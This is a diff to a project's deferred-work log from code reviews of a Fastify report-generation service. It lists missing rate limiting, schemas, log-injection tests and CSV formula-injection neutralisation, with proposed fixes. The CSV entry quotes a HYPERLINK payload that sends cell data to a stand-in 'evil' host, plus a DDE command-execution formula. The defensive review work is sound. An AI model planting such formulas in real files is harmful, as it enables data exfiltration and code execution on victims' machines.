@@ -87,3 +87,66 @@ Items deferred during code review. Each entry includes the review date and sourc
 **Gap**: Log redaction tests cover `req.body.api_key`, top-level `api_key`, nested `*.api_key`, and `Authorization` header. They do not assert that error-path log lines (e.g. the rollback catch at [src/routes/generate.js:70-88], or any `fastify.log.error(err)` call) never include `err.message` content that might echo the api_key value back (e.g. from a Mirakl-side validation error surfaced through the queue layer).
 **Why deferred**: Relies on pino redact config + caller discipline (logging structured fields, not err.message). No current code path is known to leak, so this is a defense-in-depth test.
 **Action**: Add an `additional.test.js` case that triggers an error path with a mock that throws an `Error(<api_key value>)` and asserts no log line contains the api_key.
+
+## Deferred from: code review of 4-2-get-api-jobs-polling-endpoint (2026-04-19)
+
+### No rate limiting on polling endpoint [src/routes/jobs.js]
+**Gap**: `GET /api/jobs/:job_id` has no rate limit. The progress page polls every 1–2 s per open tab; a misbehaving or hostile client could generate millions of lookups/minute. Each lookup is a sub-ms in-memory SQLite SELECT, so the real-world CPU bound is high — but it's still a DoS amplification vector with no circuit breaker.
+**Why deferred**: Rate limiting is cross-cutting for the entire HTTP API (POST /api/generate and future GET /api/reports/:id), not specific to Story 4.2. Belongs in a separate "platform hardening" story that installs `@fastify/rate-limit` and applies it globally or per-route.
+**Action**: Add `@fastify/rate-limit` plugin registration in `src/server.js` with a sane default (e.g. 60 req/min/IP) and tighter limits for `POST /api/generate`. Consider a higher per-job_id budget (or no limit) for the legitimate polling path from browsers that authenticate to the generating user.
+
+### No behavioral test for `db.getJobStatus()` throwing (Story 4.2)
+**Gap**: If `better-sqlite3` throws (disk I/O error, DB locked, schema drift, corrupt file), the exception propagates to `errorHandler` which returns the safe 500. This is correct behavior but there is no test asserting it — a future refactor that `try/catch`es inside the route handler and `reply.send({ data: null })` instead of rethrowing would silently change the contract without failing any test.
+**Why deferred**: Same pattern already deferred for Story 4.1 (`db.createJob` throw path). Defense-in-depth, not a present bug.
+**Action**: Add an `additional.test.js` case that stubs `getJobStatus` to throw and asserts the route returns 500 `{ error: 'internal_server_error', message: ... }` via the global error handler.
+
+### No response JSON schema on GET /api/jobs/:job_id [src/routes/jobs.js]
+**Gap**: The route has no Fastify response schema. Today it is safe because `getJobStatus()` narrows to 3 columns and the route builds a fresh literal, so only `{ status, phase_message, report_id }` can serialize. A future refactor that replaces the literal with a spread (`...row`) or extends `getJobStatus()` to return more columns could accidentally leak fields without any test noticing at the serialization layer.
+**Why deferred**: Spec (Story 4.2 §"No Fastify Schema on This Route") explicitly says not to add one since there is no request body to validate. Adding an output schema (not input) would be belt-and-suspenders defense-in-depth.
+**Action**: Add `schema: { response: { 200: { type: 'object', properties: { data: { type: 'object', additionalProperties: false, required: ['status','phase_message','report_id'], properties: { status: { type: 'string' }, phase_message: { type: ['string','null'] }, report_id: { type: 'string' } } } } } } }` on the GET route. Fastify's fast-json-stringify will then drop any unknown fields at the serializer layer regardless of what the handler builds.
+
+### Control-character scrubbing in access logs relies on Pino's default serializer (Story 4.2)
+**Gap**: A malicious `job_id` containing `\r\n` or NUL bytes is currently safe from log-line injection because Pino's default `req` serializer emits structured JSON — control chars are escaped. If a future change swaps Pino for a plain-text logger, or registers a custom `req` serializer that string-concatenates the URL into a message, a crafted `job_id` could split or spoof log lines.
+**Why deferred**: No current code path is affected; today's Pino config is safe by construction.
+**Action**: Add a regression test that sends `GET /api/jobs/%00%0A%0Devil` (percent-encoded NUL/CR/LF) while capturing Pino log output, and asserts the emitted log line is a single well-formed JSON object with the control chars JSON-escaped.
+
+## Deferred from: code review of 4-3-get-api-reports-and-csv (2026-04-19)
+
+### CSV formula injection (CWE-1236) — competitor-controlled cells unescaped (Story 3.5 / 4.3)
+**Gap**: `escapeCell()` at [src/workers/scoring/buildReport.js:31-43] applies RFC 4180 quoting (commas, double-quotes, CR, LF) but does NOT prefix cells that start with `=`, `+`, `-`, `@`, `\t`, or `\r` with a leading single-quote or similar neutraliser. The CSV is built from Mirakl P11 competitor data — `product_title` is attacker-controllable by any seller listing on Worten/Carrefour. When the resulting `marketpilot-report.csv` is opened in Excel, LibreOffice Calc, or Google Sheets, such cells are interpreted as formulas (e.g. `=HYPERLINK("http://evil/steal?c="&A1,"click")` or DDE-style `=cmd|' /C calc'!A0`). Story 4.3's route layer streams `row.csv_data` verbatim (spec-mandated), so the route itself is innocent — the fix must live at build time in `buildReport.js`.
+**Why deferred**: Adding a leading `'` to at-risk cells would break the ATDD exact-byte test in `tests/epic4-4.3-get-api-reports-and-csv.atdd.test.js` ("CSV response body matches the stored csv_data exactly") and the 12-column header contract test ("CSV first line is the exact spec header") unless the neutraliser is applied only to data cells classified as "text" (not "numeric"). Current fixtures use numeric prices like `19.99` which must NOT be prefixed. Source-level comment at `buildReport.js:22-29` explicitly flags this trade-off.
+**Blast radius**: Formula execution on Pedro's / a seller's machine when opening the report CSV. Credential/file exfiltration via HYPERLINK/WEBSERVICE, or RCE via DDE in older Excel configs. Severity: MEDIUM — requires CSV to be opened in a spreadsheet app (not Notepad/cat/Preview).
+**Action**:
+1. In `buildReport.js`, classify cells: numeric cells (my_price, pt_first_price, gap, gap_pct, wow_score) pass through as-is; text cells (`ean`, `product_title`, `shop_sku`) run through a second pass that prefixes a leading `'` when the first char is in `[=+\-@\t\r]`.
+2. Update Story 3.5 ATDD / `additional.test.js` to cover each dangerous prefix for text cells and assert neutraliser is applied.
+3. Update Story 4.3 ATDD fixtures (`SAMPLE_CSV`) if the build-time output format changes, so the exact-byte assertion stays in sync.
+4. Consider also sanitising `email` at write-time — currently written to the DB untrimmed, though email never reaches the CSV.
+
+### No Cache-Control header on `/api/reports/:id` or `/api/reports/:id/csv` (Story 4.3)
+**Gap**: Neither route sets `Cache-Control`. Reports have 48h TTL; intermediate caches (corporate proxies, CDN misconfigs) could in theory cache a response under the unguessable URL. Report IDs are UUIDs → blast radius is one leaked URL per cache, but defense-in-depth would add `Cache-Control: private, no-store`.
+**Why deferred**: Low priority. Report URLs are unguessable; there is no CDN in front of the MVP (Traefik → Fastify direct); current deploy doesn't add shared caches. No AC requires it.
+**Action**: Add `Cache-Control: private, no-store` header on both successful JSON and CSV responses when infra changes (e.g. CDN fronting) make it relevant, or as blanket hardening once the 48h TTL is formally documented externally.
+
+### No rate limiting on `/api/reports/:id` and `/api/reports/:id/csv` (Story 4.3)
+**Gap**: A token-holder could repeatedly hit `/api/reports/:id/csv` to force large TEXT-column reads from SQLite. Fastify app has no `@fastify/rate-limit` plugin configured. For Worten-scale catalogs (~6 MB CSV), this is bounded; for future scale, it's a DoS vector.
+**Why deferred**: Report IDs are unguessable; legitimate users poll infrequently (HTML page fetches JSON once, downloads CSV once). Traefik can enforce rate limits externally in the MVP deploy. Not a correctness issue.
+**Action**: Covered by the broader rate-limiting action already deferred for Story 4.2 (install `@fastify/rate-limit` globally). When that work happens, apply the global default to `/api/reports/:id` and a lighter budget to `/csv` (legitimate use is one-shot download).
+
+## Deferred from: PR #45 review (2026-04-19)
+
+*Note: One finding from the audit ("No behavioral test for `db.getJobStatus()` throwing") duplicates an existing entry under "code review of 4-2-get-api-jobs-polling-endpoint" and is omitted here. The items below are net-new.*
+
+### Malformed / oversized `job_id` not tested at route boundary (Story 4.2)
+**Gap**: ATDD tests in [tests/epic4-4.2-get-api-jobs-polling.atdd.test.js] cover the happy 404 path for an unknown UUID but do not assert route behaviour for pathological inputs — very long strings (e.g. 10 KB), special characters (`../`, `%00`, `?`, `&`), or malformed UUIDs. The route passes `job_id` straight to `db.getJobStatus()` with no format check; SQLite's prepared statement parameter binding is safe against injection, but a client sending a 10-MB path segment would currently traverse the full stack to the DB before returning 404.
+**Why deferred**: Distinct from the adjacent Phase-1 entry on "control-character scrubbing in access logs" — that one is about log-line injection; this one is about route-level input-length / malformed-input handling. Low risk (Fastify default body/URL limits already bound the damage; SQLite is injection-safe), but a small upfront length/format guard would let the route return 404 without a DB round-trip.
+**Action**: Add a boundary test (oversized string, special characters, non-UUID) and either a lightweight `typeof`+length guard or a Fastify route-param schema (`{ params: { type: 'object', properties: { job_id: { type: 'string', maxLength: 128 } } } }`) to short-circuit obvious junk at routing time.
+
+### AC-6 status-value coverage incomplete in ATDD (Story 4.2)
+**Gap**: AC-6 asserts "all six valid status values (`queued`, `fetching_catalog`, `scanning_competitors`, `building_report`, `complete`, `error`) are representable in the response." The ATDD file only seeds a job with `queued` and polls once; the other five statuses are not exercised end-to-end. Today the route is a passthrough (`status` returned verbatim), so coverage is trivially satisfied — but a future refactor that narrows, transforms, or filters statuses would not be caught by the test suite.
+**Why deferred**: Low-risk (route has no transformation logic). Parameterising the test over all six status values would harden the AC without adding production code.
+**Action**: Extend ATDD with a parameterised `for (const status of ALL_STATUSES)` loop that seeds a job at each status and asserts the response echoes it unchanged.
+
+### Log redaction assertion missing on jobs route (Story 4.2)
+**Gap**: The ATDD file verifies `api_key` is absent from the response body but does not assert that request/response log lines never contain api_key or Authorization header values. The jobs route doesn't receive api_key in this flow (it's a polling-only GET), so the risk is theoretical — but relies entirely on the global pino redact config in `src/server.js` staying correct. A future redact-path regression would silently re-enable leaks.
+**Why deferred**: Defense-in-depth. No current code path in `src/routes/jobs.js` handles api_key, so there's nothing concrete to leak today. Distinct from the existing "control-character scrubbing" entry, which is about log-line injection, not api_key redaction.
+**Action**: Once story 1.2's global redact test is generalised into a shared helper, reuse it on the jobs route: send a request with an `Authorization: Bearer <value>` header and an `api_key` query string, capture pino log output, and assert neither value appears unredacted in any log line.
